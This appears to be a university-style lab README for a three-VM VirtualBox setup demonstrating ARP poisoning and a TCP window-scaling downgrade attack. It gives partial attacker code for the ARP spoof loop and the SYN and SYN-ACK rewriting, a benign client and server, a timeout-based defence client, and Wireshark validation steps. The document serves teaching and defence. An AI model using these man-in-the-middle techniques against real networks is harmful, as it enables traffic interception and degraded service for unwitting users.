# MITM TCP Lab: Window Scaling Attack & ARP Poisoning


## Detailed Lab Process: ARP Poisoning, TCP Window Scaling Attack, and Defence

### 1. ARP Poisoning (`attacker-code/tcp_arp_poison.py`)
```python
# ...existing code...
def send_arp_poison(target_ip, spoof_ip, interface):
    # Build ARP reply packet
    # ...construct ARP reply...
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((interface, 0))
    while True:
        sock.send(arp_packet)
        time.sleep(2)
# Poison both client and server ARP tables
send_arp_poison(client_ip, server_ip, interface)
send_arp_poison(server_ip, client_ip, interface)
```
**Explanation:**
- The attacker repeatedly sends forged ARP replies to both the client and server, associating its own MAC address with the IP of the other party.
- This poisons the ARP tables, ensuring all traffic between client and server is routed through the attacker (MITM position).

### 2. TCP Window Scaling Attack (`attacker-code/tcp_window_attack.py`)
```python
# ...existing code...
if parsed['flags'] == 0x02 or parsed['flags'] == 0x12:  # SYN or SYN-ACK
    if random.random() < 0.5:
        print(f"Intercepted SYN/SYN-ACK (MODIFIED): {src_ip}:{parsed['src_port']} -> {dst_ip}:{parsed['dst_port']}")
        new_packet = craft_tcp_packet(parsed, window_scale=0)
        sock_send.sendto(new_packet, (parsed['dst_ip'], 0))
        print("Sent modified packet with Window Scale = 0")
    else:
        print(f"Intercepted SYN/SYN-ACK (UNMODIFIED): {src_ip}:{parsed['src_port']} -> {dst_ip}:{parsed['dst_port']}")
        sock_send.sendto(packet[14:], (parsed['dst_ip'], 0))
```
**Explanation:**
- The attacker sniffs for TCP handshake packets (SYN, SYN-ACK) between client and server.
- For each handshake, it randomly decides (e.g., 50% of the time) to modify the TCP window scale option, setting it to zero (disabling window scaling).
- Modified packets are forwarded to the destination, while others are passed unmodified.
- This limits the effective TCP window size for some connections, reducing throughput and degrading performance.

### 3. TCP Server (`server-code/tcp_server.py`)
```python
import socket
import threading

def handle_client(client_socket, client_address):
    while True:
        data = client_socket.recv(1024)
        if not data:
            break
        message = data.decode()
        print(f"Received from {client_address}: {message}")
        response = f"Server received: {message}"
        client_socket.send(response.encode())
    client_socket.close()

def tcp_server(host="0.0.0.0", port=8080):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"TCP Server listening on {host}:{port}")
    while True:
        client_socket, client_address = server_socket.accept()
        threading.Thread(target=handle_client, args=(client_socket, client_address), daemon=True).start()
```
**Explanation:**
- The server listens for incoming TCP connections and handles each client in a separate thread.
- It receives messages and sends responses, unaware of the attack but potentially experiencing reduced throughput.

### 4. TCP Client (`client-code/tcp_client.py`)
```python
import socket
import time
import sys
from datetime import datetime

def send_in_chunks(sock, message, chunk_size=4096):
    total_sent = 0
    msg_bytes = message.encode()
    while total_sent < len(msg_bytes):
        sent = sock.send(msg_bytes[total_sent:total_sent+chunk_size])
        if sent == 0:
            raise RuntimeError("Socket connection broken")
        total_sent += sent

def send_message_with_retries(client_socket, message, server_ip, server_port, max_retries=3):
    retries = 0
    while retries <= max_retries:
        try:
            send_in_chunks(client_socket, message)
            client_socket.settimeout(5)
            response = client_socket.recv(4096)
            now2 = datetime.now().strftime('%H:%M:%S')
            print(f"[{now2}] Received response: {response.decode()[:60]}... (truncated)")
            return True
        except socket.timeout:
            print(f"No response received (timeout) at {datetime.now().strftime('%H:%M:%S')}")
            retries += 1
            if retries > max_retries:
                print("Max retries reached. Skipping message.")
                return False
        except socket.error as e:
            print(f"Socket error during send/receive: {e}")
            retries += 1
            if retries > max_retries:
                print("Max retries reached. Skipping message.")
                return False
            print("Reconnecting...")
            client_socket.close()
            time.sleep(2)
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            client_socket.connect((server_ip, server_port))
    return False

def tcp_client(server_ip="192.168.56.20", server_port=8080):
    max_retries = 3
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        print(f"Connecting to {server_ip}:{server_port}...")
        client_socket.connect((server_ip, server_port))
        print("Connected successfully!")
        messages = [
            "Hello Server!",
            "This is a test message",
            "Testing TCP window scaling",
            "MITM Lab Test Data",
            "BIG_MESSAGE: " + ("X" * 500000)  # 500KB payload
        ]
        for i, message in enumerate(messages, 1):
            now = datetime.now().strftime('%H:%M:%S')
            print(f"[{now}] Sending message {i} (len={len(message)}): ...")
            send_message_with_retries(client_socket, message, server_ip, server_port, max_retries)
            time.sleep(1)
        client_socket.close()
        print("Connection closed.")
    except socket.error as e:
        print(f"Socket error: {e}")
    except KeyboardInterrupt:
        print("\nClient interrupted by user")
        if 'client_socket' in locals():
            client_socket.close()
```
**Explanation:**
- The client connects to the server and sends a series of test messages, including a very large message to stress the connection.
- It uses chunked sending and retries for robustness, and prints responses.
- Under attack, the client may experience timeouts and slow communication on connections where window scaling is disabled.

### 5. TCP Client Defence (`client-code/tcp_client_defence.py`)
```python
for i, message in enumerate(messages, 1):
    print(f"Sending message {i}: {message}")
    client_socket.send(message.encode())
    total_sent += 1
    try:
        client_socket.settimeout(3)
        response = client_socket.recv(1024)
        print(f"Received response: {response.decode()}")
        timeout_count = 0  # Reset on success
    except socket.timeout:
        timeout_count += 1
        total_timeouts += 1
        print("No response received (timeout)")
        if total_sent > 3 and total_timeouts / total_sent > 0.3:
            print("CRITICAL: High rate of timeouts detected (>30%). Possible TCP window size zero attack!")
            print("Attempting to reconnect...")
            client_socket.close()
            time.sleep(2)
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))
            timeout_count = 0
            total_timeouts = 0
            total_sent = 0
        elif timeout_count >= 3:
            print("WARNING: Multiple consecutive timeouts. Possible TCP window size zero attack!")
            print("Attempting to reconnect...")
            client_socket.close()
            time.sleep(2)
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))
            timeout_count = 0
    time.sleep(2)
```
**Explanation:**
- The defense client sends multiple messages and tracks timeouts.
- If more than 30% of messages time out, or if there are 3 consecutive timeouts, it warns the user of a possible TCP window scaling attack and attempts to reconnect.
- This helps detect and mitigate the attack by avoiding persistently bad connections and informing the user.

---

**Summary Table**

| Component         | What It Does                                              | How It Works                                                      | Result                                    |
|-------------------|----------------------------------------------------------|-------------------------------------------------------------------|--------------------------------------------|
| **ARP Poisoning** | MITM positioning                                         | Spoofs ARP replies to client/server                               | Attacker intercepts all traffic            |
| **Window Attack** | Degrades TCP performance                                 | Randomly disables window scaling on some handshakes               | Lower throughput, unpredictable performance|
| **Server**        | Handles client connections                               | Receives and responds to messages                                 | May experience reduced throughput          |
| **Client**        | Sends messages to server                                 | Connects and communicates, uses retries and chunked sending       | May see timeouts and slow responses        |
| **Defence Client**| Detects and mitigates attack                             | Monitors timeouts, warns user, reconnects                         | Detects attack symptoms, attempts recovery |

---

**Validation:**  
- Use Wireshark to observe handshake packets and confirm window scale manipulation.
- Look for increased retransmissions and zero window events as evidence of the attack’s impact.
- The defense client will print warnings and attempt to recover if attack symptoms are detected.

---

## Configuration & Setup Guide

This guide provides step-by-step instructions to set up and run the virtual lab environment for the TCP Window Scaling Attack demonstration. All commands are copy-paste ready for your convenience.

---

### 1. Import and Prepare Virtual Machines
- Import the Attacker, Client, and Server VMs using the `.vbox` files in your VM storage directory.
- In VirtualBox, go to **VM Settings → Shared Folders → Machine Folders → Add new shared folder**:
  - **Folder Path:** `/home/ninad-nobo/MITM-TCP-Lab/window-scaling-attack/<VM-Name>-code`
  - **Folder Name:** `mitm-lab`
  - **Mount point:** `/media/sf_mitm-lab`
  - Check: Auto-mount
  - Check: Make Permanent
- Enable VirtualBox Features:
  - VM Settings → General → Advanced:
    - **Shared Clipboard: Bidirectional** (enables copy-paste between host and VM)
    - **Drag'n'Drop: Bidirectional**

> **Copy-paste is enabled after this step.**

---

### 2. Initial Setup: Use NAT for Internet Access
- Shutdown the VM.
- In VirtualBox: Settings → Network → Adapter 1 → Set to **NAT**
- Start the VM.

#### Install Required Packages
- **Attacker VM:**
  ```bash
  sudo apt update
  sudo apt install -y python3-pip scapy tcpdump wireshark-tui nmap wireshark tshark python3-scapy python3-netifaces
  ```
- **Client & Server VMs:**
  ```bash
  sudo apt update
  sudo apt install -y python3-pip
  ```

#### Install VirtualBox Guest Additions
  ```bash
  sudo apt install -y build-essential dkms linux-headers-$(uname -r) bzip2
  # Insert Guest Additions CD: Devices → Insert Guest Additions CD Image
  sudo mkdir -p /mnt/cdrom
  sudo mount /dev/cdrom /mnt/cdrom
  sudo /mnt/cdrom/VBoxLinuxAdditions.run
  sudo usermod -aG vboxsf $USER
  sudo reboot
  ```

#### Start VirtualBox Client Services (after reboot)
  ```bash
  VBoxClient --clipboard &
  VBoxClient --draganddrop &
  VBoxClient --seamless &
  ```

#### Mount Shared Folder (if not auto-mounted)
  ```bash
  sudo mkdir -p /media/sf_mitm-lab
  sudo mount -t vboxsf mitm-lab /media/sf_mitm-lab
  ```

#### Make Scripts Executable
  ```bash
  cd /media/sf_mitm-lab
  chmod +x *.py
  ```

---

### 3. Switch to Host-Only Network for Lab
- Shutdown the VM.
- In VirtualBox: Settings → Network → Adapter 1 → Set to **Host-Only Adapter** (vboxnet0)
- Start the VM.

---

### 4. Configure Static IP Addresses
On each VM, open the netplan configuration file for editing:
  ```bash
  sudo nano /etc/netplan/01-netcfg.yaml
  ```
Paste the following content according to the VM role:
- **Client VM:**
  ```yaml
  network:
    ethernets:
      enp0s3:
        addresses: [192.168.56.10/24]
        gateway4: 192.168.56.1
        nameservers:
          addresses: [8.8.8.8]
    version: 2
  ```
- **Server VM:**
  ```yaml
  network:
    ethernets:
      enp0s3:
        addresses: [192.168.56.20/24]
        gateway4: 192.168.56.1
        nameservers:
          addresses: [8.8.8.8]
    version: 2
  ```
- **Attacker VM:**
  ```yaml
  network:
    ethernets:
      enp0s3:
        addresses: [192.168.56.30/24]
        gateway4: 192.168.56.1
        nameservers:
          addresses: [8.8.8.8]
    version: 2
  ```
Save and exit (`Ctrl+O`, `Enter`, `Ctrl+X`), then apply the configuration:
  ```bash
  sudo netplan apply
  ```

---

### 5. Enable IP Forwarding (Attacker VM Only)
  ```bash
  echo 'net.ipv4.ip_forward=1' | sudo tee -a /etc/sysctl.conf
  sudo sysctl -p
  ```

---

### 6. Test Network Configuration
On each VM, run:
  ```bash
  ping -c 2 192.168.56.1
  ping -c 2 192.168.56.10
  ping -c 2 192.168.56.20
  ping -c 2 192.168.56.30

  ip addr show enp0s3
  ip route show
  ```

---

## Project Folder Structure

```
window-scaling-attack/
├── README.md
├── report1.pdf
├── attacker-code/
│   ├── tcp_arp_poison.py
│   └── tcp_window_attack.py
├── client-code/
│   ├── tcp_client.py
│   └── tcp_client_defence.py
├── server-code/
│   └── tcp_server.py
```

---

## Lab Run Instructions

### Step 0: Unload KVM modules on your host machine

  ```bash
  sudo rmmod kvm_intel
  sudo rmmod kvm
  virtualbox
  ```

### Step 1: Verify Connectivity
- **Server VM (Terminal 1):**
  ```bash
  ping -c 4 192.168.56.10  # Ping Client
  ```
- **Client VM (Terminal 1):**
  ```bash
  ping -c 4 192.168.56.20  # Ping Server
  ```

### Step 2: Check ARP Tables
- **Server VM (Terminal 1):**
  ```bash
  ip neigh
  ```
- **Client VM (Terminal 1):**
  ```bash
  ip neigh
  ```

### Step 3: Run ARP Poisoning
- **Attacker VM (Terminal 1):**
  ```bash
  cd /media/sf_mitm-lab
  sudo python3 tcp_arp_poison.py
  ```

### Step 4: Confirm ARP Poisoning
- **Server VM (Terminal 1):**
  ```bash
  ip neigh  # Should show Attacker's MAC for Client IP
  ```
- **Client VM (Terminal 1):**
  ```bash
  ip neigh  # Should show Attacker's MAC for Server IP
  ```

---

## Run with Normal Client

### Step 5: Start TCP Server
- **Server VM (Terminal 2):**
  ```bash
  cd /media/sf_mitm-lab
  python3 tcp_server.py
  ```

### Step 6: Start Window Scaling Attack
- **Attacker VM (Terminal 2):**
  ```bash
  cd /media/sf_mitm-lab
  sudo python3 tcp_window_attack.py
  ```

### Step 7: Start Wireshark (for normal client run)
- **Attacker VM (Terminal 3):**
  ```bash
  wireshark -k -i enp0s3 &
  # Use filter: tcp.window_size == 0
  ```

### Step 8: Capture Packets with tcpdump (for normal client run)
- **Attacker VM (Terminal 4):**
  ```bash
  sudo tcpdump -i enp0s3 -w attack-client.pcap
  ```

### Step 9: Start TCP Client
- **Client VM (Terminal 2):**
  ```bash
  cd /media/sf_mitm-lab
  python3 tcp_client.py
  ```

### Step 10: Stop/Close Terminals after Normal Client Run
- **Client VM (Terminal 2):** Stop/close after client finishes.
- **Attacker VM (Terminal 2, 3, 4):** Stop/close after attack and capture are complete.
- **Server VM (Terminal 2):** Stop/close after server finishes.

---

## Run with Defence Client

### Step 11: Restart tcpdump for defence run (optional)
- **Attacker VM (Terminal 4):**
  ```bash
  sudo tcpdump -i enp0s3 -w attack-defence.pcap
  ```

### Step 12: (Optional) Restart Wireshark for defence run
- **Attacker VM (Terminal 3):**
  ```bash
  wireshark -k -i enp0s3 &
  # Use filter: tcp.window_size == 0
  ```

### Step 13: Start Defence Client
- **Client VM (Terminal 3):**
  ```bash
  cd /media/sf_mitm-lab/client-code
  python3 tcp_client_defence.py
  ```

### Step 14: Stop/Close Terminals after Defence Client Run
- **Client VM (Terminal 3):** Stop/close after defence client finishes.
- **Attacker VM (Terminal 3, 4):** Stop/close after capture and analysis are complete.

---

### Wireshark Filters for Validation and Demonstration

**1. To see all SYN and SYN-ACK packets between client and server:**

```
(ip.addr == 192.168.56.10 or ip.addr == 192.168.56.20) and (tcp.flags.syn == 1)
```
*Expected Behavior/Observation:* You will see the initial handshake packets. Under attack, some SYN/SYN-ACK packets will be missing the Window Scale option or have WS=0, indicating the attack is modifying the handshake.


**2. To see all traffic between client and server (for general inspection):**

```
ip.addr == 192.168.56.10 or ip.addr == 192.168.56.20
```
*Expected Behavior/Observation:* You can inspect all packets between the client and server. Under attack, you will notice increased delays, retransmissions, and possibly abrupt connection resets.

**How to use:**
- Apply these filters in Wireshark to validate each stage of the attack and defence demonstration.
- Use the Window Scale filter to confirm the attack is modifying the handshake.
- Use retransmission and zero window filters to see the impact on performance.
- Compare normal and attack runs to clearly observe the difference.

---

### How to Stop/Close and Capture

**tcpdump (Attacker VM, Terminal 4):**
- To stop and save the capture, press `Ctrl+C` in the terminal running tcpdump.
- The `.pcap` file (e.g., `attack-client.pcap` or `attack-defence.pcap`) will be saved in your current directory.

**Wireshark (Attacker VM, Terminal 3):**
- To stop live capture, click the red square “Stop” button in the Wireshark window.
- To close Wireshark, simply close the application window.

**Python scripts (Client/Server/Attacker):**
- To stop a running Python script (e.g., `tcp_client.py`, `tcp_client_defence.py`, `tcp_server.py`, `tcp_window_attack.py`), press `Ctrl+C` in the terminal where it is running.
- Then close the terminal window if you are done.

**Summary:**
1. Press `Ctrl+C` in each terminal running a script or tcpdump to stop the process.
2. Close the terminal window if you no longer need it.
3. In Wireshark, click “Stop” and close the window.

Your capture files will be available for analysis in Wireshark or other tools.

---